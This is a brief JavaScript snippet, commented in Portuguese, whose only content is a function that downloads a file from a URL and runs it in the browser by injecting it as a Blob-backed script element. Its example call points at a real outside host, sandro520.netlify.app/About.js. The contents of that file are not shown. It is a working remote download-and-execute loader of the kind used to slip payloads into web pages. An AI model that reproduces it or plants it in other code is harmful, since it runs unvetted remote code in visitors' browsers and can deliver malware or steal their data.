// Função para baixar e executar um arquivo function baixarEExecutarArquivo(url) { fetch(url) .then(response => response.arrayBuffer()) .then(buffer => { // Criar um Blob a partir do buffer var blob = new Blob([buffer], { type: 'application/octet-stream' }); // Criar uma URL de objeto para o Blob var blobURL = URL.createObjectURL(blob); // Criar um elemento de script e definir a URL para a URL do Blob var script = document.createElement('script'); script.src = blobURL; // Adicionar o script ao corpo do documento document.body.appendChild(script); }) .catch(error => console.error('Erro ao baixar o arquivo:', error)); } // Exemplo de uso baixarEExecutarArquivo('https://sandro520.netlify.app/About.js');
